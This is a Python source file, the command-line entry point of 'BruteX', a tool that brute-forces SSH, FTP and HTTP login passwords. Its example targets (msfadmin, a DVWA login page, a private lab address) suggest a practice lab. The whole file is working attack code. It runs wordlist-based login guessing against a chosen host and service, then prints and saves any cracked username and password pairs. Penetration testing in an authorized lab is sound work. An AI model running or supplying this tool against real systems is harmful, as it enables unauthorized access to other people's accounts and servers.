# brutex.py — BruteX Main Entry Point
# Usage:
#   python brutex.py -t 192.168.56.200 -s ssh -u msfadmin
#   python brutex.py -t 192.168.56.200 -s ftp -u msfadmin
#   python brutex.py -t 192.168.56.200 -s http -u admin
#   python brutex.py -t 192.168.56.200 -s all -u msfadmin

import argparse
import json
from datetime    import datetime
from wordlist_gen import get_wordlist
from ssh_brute   import ssh_brute
from ftp_brute   import ftp_brute
from http_brute  import http_brute
from logger      import log, clear_logs

def print_banner():
    print("""
  ╔══════════════════════════════════════════╗
  ║          BRUTEX  v1.0                    ║
  ║     SSH | FTP | HTTP Brute Forcer        ║
  ║   [!] For authorized testing only        ║
  ╚══════════════════════════════════════════╝
    """)

def save_report(results, target):
    """Save all results to JSON report."""
    report = {
        "scan_time": datetime.now().isoformat(),
        "target":    target,
        "results":   results
    }
    with open("brutex_report.json", "w") as f:
        json.dump(report, f, indent=2)
    log("Report saved → brutex_report.json", "INFO")

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="BruteX — SSH/FTP/HTTP Brute Force Tool"
    )
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Target IP or hostname"
    )
    parser.add_argument(
        "-s", "--service",
        required=True,
        choices=["ssh", "ftp", "http", "all"],
        help="Service to attack"
    )
    parser.add_argument(
        "-u", "--username",
        required=True,
        help="Username to brute force"
    )
    parser.add_argument(
        "-w", "--wordlist",
        default=None,
        help="Path to wordlist file (default: built-in)"
    )
    parser.add_argument(
        "--ssh-port",  default=22,   type=int)
    parser.add_argument(
        "--ftp-port",  default=21,   type=int)
    parser.add_argument(
        "--http-port", default=80,   type=int)
    parser.add_argument(
        "--http-path", default="/dvwa/login.php")
    parser.add_argument(
        "--fail-string", default="Login failed")

    args    = parser.parse_args()
    results = []

    clear_logs()
    passwords = get_wordlist(args.wordlist, args.username)

    # SSH Attack
    if args.service in ["ssh", "all"]:
        log(f"\n{'='*45}", "INFO")
        log("PHASE 1 — SSH BRUTE FORCE", "INFO")
        log(f"{'='*45}\n", "INFO")
        result = ssh_brute(
            args.target, args.ssh_port,
            args.username, passwords
        )
        if result:
            results.append({
                "service":  "SSH",
                "host":     args.target,
                "port":     args.ssh_port,
                "username": result[0],
                "password": result[1]
            })

    # FTP Attack
    if args.service in ["ftp", "all"]:
        log(f"\n{'='*45}", "INFO")
        log("PHASE 2 — FTP BRUTE FORCE", "INFO")
        log(f"{'='*45}\n", "INFO")
        result = ftp_brute(
            args.target, args.ftp_port,
            args.username, passwords
        )
        if result:
            results.append({
                "service":  "FTP",
                "host":     args.target,
                "port":     args.ftp_port,
                "username": result[0],
                "password": result[1]
            })

    # HTTP Attack
    if args.service in ["http", "all"]:
        log(f"\n{'='*45}", "INFO")
        log("PHASE 3 — HTTP BRUTE FORCE", "INFO")
        log(f"{'='*45}\n", "INFO")
        result = http_brute(
            args.target, args.http_port,
            args.http_path, "username", "password",
            args.username, passwords,
            args.fail_string
        )
        if result:
            results.append({
                "service":  "HTTP",
                "host":     args.target,
                "port":     args.http_port,
                "username": result[0],
                "password": result[1]
            })

    # Summary
    log(f"\n{'='*45}", "INFO")
    log("SCAN COMPLETE", "INFO")
    log(f"{'='*45}", "INFO")
    log(f"Target:   {args.target}", "INFO")
    log(f"Username: {args.username}", "INFO")
    log(f"Cracked:  {len(results)} service(s)", "INFO")

    for r in results:
        log(f"  ✓ {r['service']} → {r['username']}:{r['password']}", "SUCCESS")

    save_report(results, args.target)

if __name__ == "__main__":
    main()